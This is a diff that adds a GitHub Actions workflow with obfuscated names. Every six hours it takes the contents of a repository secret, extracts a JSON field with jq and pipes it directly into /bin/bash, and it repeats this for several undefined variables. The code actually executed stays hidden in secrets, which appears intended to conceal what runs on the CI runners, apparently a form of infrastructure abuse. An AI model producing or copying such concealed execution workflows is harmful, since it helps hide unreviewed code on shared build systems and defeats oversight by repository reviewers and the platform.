@@ -1,0 +1,25 @@
+name: laojiangzhongzheng
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: laojiangzhongzheng
+        env:
+          ptcp563: ${{ secrets.ptcp563 }}
+        run: |
+          echo $ptcp563 | jq -r .r64 | /bin/bash
+          echo $ha03 | jq -r .zmsn33786 | /bin/bash
+          echo $drds372 | jq -r .igefz334 | /bin/bash
+          echo $x459 | jq -r .ja895 | /bin/bash
+          echo $jj15 | jq -r .ixphq3126 | /bin/bash
+          echo $ycu8048 | jq -r .o052 | /bin/bash
+          echo $gzg37 | jq -r .fqn23156 | /bin/bash
+
